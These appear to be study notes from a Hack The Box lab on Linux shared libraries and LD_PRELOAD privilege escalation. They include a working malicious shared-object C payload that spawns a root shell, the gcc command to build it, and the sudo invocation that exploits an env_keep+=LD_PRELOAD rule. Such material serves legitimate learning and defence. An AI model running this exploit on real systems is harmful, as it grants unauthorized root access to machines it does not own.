Two types of libraries exist for compiled code:
- dynamic (.so extension)
- static (.a extension)
Note: on windows, `dll` are the equivalent of shared object

At compile time, static libraries become part of the program and cannot be modified, whereas dynamically linked shared object libraries can.

### Dynamic libraries location
Multiple ways exist to show location of dynamic libraries:
- `-rpath` flag for compilation
- `LD_RUN_PATH`/`LD_LIBRARY_PATH` environment variable
- /`usr/lib` or `/lib`
- `/etc/ld.so.conf`
- `LD_PRELOAD`

To handle shared object with a library, use `ldd`
To check prefered path for shared library (`RUNPATH`), we can run readelf. This path can be exploited if we have run access.


### Example for LD_PRELOAD

Suppose we have the following privileges:
```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

As apache is not part of the GTFObin and  `/etc/sudoers` entry specifies the absolute path, we could not be used for privilege escalation with standard methods.
However, we can exploit the `LD_PRELOAD` to run a custom library before running the apache bin.

For example, we write the following:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

which we compile with:

```shell-session
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```
- `-fPIC`: position independent (machine code does not need to be at specific address)

We can the run apache restart with:
```shell-session
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```